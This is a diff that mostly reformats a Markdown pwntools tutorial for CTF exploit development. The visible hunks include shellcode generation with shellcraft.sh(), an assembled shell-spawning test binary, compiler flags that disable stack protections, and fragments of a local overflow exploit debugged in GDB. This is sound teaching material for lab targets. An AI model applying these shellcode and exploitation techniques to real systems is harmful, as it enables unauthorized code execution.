@@ -1,17 +1,16 @@
 # Pwntools Tutorial
----
 
-Even though pwntools is an excellent CTF framework, it is also an exploit development library. It was developed by Gallopsled, a European CTF team, under the context that exploit developers have been writing the same tools over and over again with different variations. Pwntools comes to level the playing field and bring together developers to create a common framework of tools.
+Even though pwntools is an excellent CTF framework, it is also an exploit development library.
+It was developed by `Gallopsled`, a European CTF team, under the context that exploit developers have been writing the same tools over and over again with different variations.
+Pwntools comes to level the playing field and bring together developers to create a common framework of tools.
 
 ## Installation
----
 
-```bash
-$ pip install -U pwntools
+```console
+pip install -U pwntools
 ```
 
-## Local and remote I/O
----
+## Local and Remote I/O
 
 Pwntools enables you to dynamically interact (through scripting) with either local or remote processes, as follows:
 
@@ -73,7 +72,7 @@ io.interactive()
 
 If we run the previous script, we get the following output:
 
-```
+```text
 [+] Starting local process './leaky': Done
 Got: Okay, here you go: 0xffe947d8 S
 
@@ -83,7 +82,8 @@ Got: Okay, here you go: 0xffe947d8 S
 $
 ```
 
-Notice the $ prompt which still awaits input from us to feed the process. This is due to the `io.interactive()` line at the end of the script.
+Notice the `$` prompt which still awaits input from us to feed the process.
+This is due to the `io.interactive()` line at the end of the script.
 
 We can encapsulate the previous sequence of interactions inside a function which we can loop.
 
@@ -126,9 +126,10 @@ The flag is: SECRETFLAG
 ```
 
 ## Logging
----
 
-The previous example was a bit… quiet. Fortunately, pwntools has nicely separated logging capabilities to make things more verbose for debugging and progress-viewing purposes. Let's log each of our steps within the `leak_char` function.
+The previous example was a bit... quiet.
+Fortunately, pwntools has nicely separated logging capabilities to make things more verbose for debugging and progress-viewing purposes.
+Let's log each of our steps within the `leak_char` function.
 
 ```python
 def leak_char(offset):
@@ -151,7 +152,7 @@ def leak_char(offset):
 
 Now the output should be much more verbose:
 
-```
+```text
 [+] Starting local process './leaky': Done
 [*] Sending request for offset: -10
 [*] Got back raw response: Okay, here you go: 0xffb14948 S
@@ -188,7 +189,6 @@ Now the output should be much more verbose:
 ```
 
 ## Assembly and ELF manipulation
----
 
 Pwntools can also be used for precision work, like working with ELF files and their symbols.
 
@@ -206,7 +206,8 @@ log.info("Main at: " + hex(main_addr))
 log.info(disasm(leaky_elf.read(main_addr, 14), arch='x86'))
 ```
 
-We can also write ELF files from raw assembly; this is very useful for testing shellcodes.
+We can also write ELF files from raw assembly;
+this is very useful for testing shellcodes.
 
 ```python
 #!/usr/bin/env python
@@ -229,14 +230,14 @@ with open('test_shell', 'wb') as f:
     f.write(e.get_data())
 ```
 
-> This will result in a binary named test_shell which executes the necessary assembly code to spawn a shell.
-> ```bash
-> $ chmod u+x test_shell
-> $ ./test_shell
-> ```
+This will result in a binary named `test_shell` which executes the necessary assembly code to spawn a shell:
+
+```console
+chmod u+x test_shell
+./test_shell
+```
 
 ## Shellcode generation
----
 
 Pwntools comes with the `shellcraft` module, which is quite extensive in its capabilities.
 
@@ -286,25 +287,26 @@ These shellcodes can be directly assembled using asm inside your script, and giv
 ''', arch = 'amd64')
 ```
 
+Most of the time you'll be working with as specific vulnerable program.
+To avoid specifying architecture for the `asm()` function or to `shellcraft()` you can define the context at the start of the script which will imply the architecture from the binary header.
 
-> Most of the time you'll be working with as specific vulnerable program. To avoid specifing architecture for the asm function or to shellcraft you can define the context at the start of the script which will imply the architecture from the binary header.
-> ```python
-> context.binary = './vuln_program'
->
-> shellcode = asm('''
->       mov rdi, 0
->       mov rax, 60
->       syscall
-> ''')
-> print(shellcraft.sh())
-> ```
+```python
+context.binary = './vuln_program'
+
+shellcode = asm('''
+      mov rdi, 0
+      mov rax, 60
+      syscall
+''')
+print(shellcraft.sh())
+```
 
 ## GDB integration
----
 
 Most importantly, pwntools provides GDB integration, which is extremely useful.
 
 Let's follow an example using the following program:
+
 ```asm
 extern gets
 extern printf
@@ -327,13 +329,16 @@ main:
 	leave
 	ret
 ```
+
 Compile it with:
-```bash
-$ nasm vuln.asm -felf64
-$ gcc -no-pie -fno-pic  -fno-stack-protector -z execstack vuln.o -o vuln
+
+```console
+nasm vuln.asm -felf64
+gcc -no-pie -fno-pic  -fno-stack-protector -z execstack vuln.o -o vuln
 ```
 
 Use this script to exploit the program:
+
 ```python
 #!/usr/bin/env python
 from pwn import *
@@ -379,7 +384,11 @@ p.sendline(payload)
 p.interactive()
 ```
 
-Notice the `gdb.attach(p)` and raw_input lines. The former will open a new terminal window with GDB already attached. All of your GDB configurations will be used, so this works with PEDA as well. Let's set a breakpoint at the ret instruction from the main function:
+Notice the `gdb.attach(p)` and raw_input lines.
+The former will open a new terminal window with GDB already attached.
+All of your GDB configurations will be used, so this works with PEDA as well.
+Let's set a breakpoint at the `ret` instruction from the main function:
+
 ```gdb
 gdb-peda$ pdis main
 Dump of assembler code for function main:
@@ -403,6 +412,9 @@ gdb-peda$ c
 Continuing.
 ```
 
-The continue command will return control to the terminal in which we're running the pwntools script. This is where the raw_input comes in handy, because it will wait for you to say “go” before proceeding further. Now if you hit `<Enter>` at the Send payload? prompt, you will notice that GDB has reached the breakpoint you've previously set.
+The continue command will return control to the terminal in which we're running the pwntools script.
+This is where the `raw_input()` function comes in handy, because it will wait for you to say`“go` before proceeding further.
+Now if you hit `<Enter>` at the `Send payload?` prompt, you will notice that GDB has reached the breakpoint you've previously set.
 
-You can now single-step each instruction of the shellcode inside GDB to see that everything is working properly. Once you reach int `0x80`, you can continue again (or close GDB altogether) and interact with the newly spawned shell in the pwntools session.
+You can now single-step each instruction of the shellcode inside GDB to see that everything is working properly.
+Once you reach int `0x80`, you can continue again (or close GDB altogether) and interact with the newly spawned shell in the pwntools session.
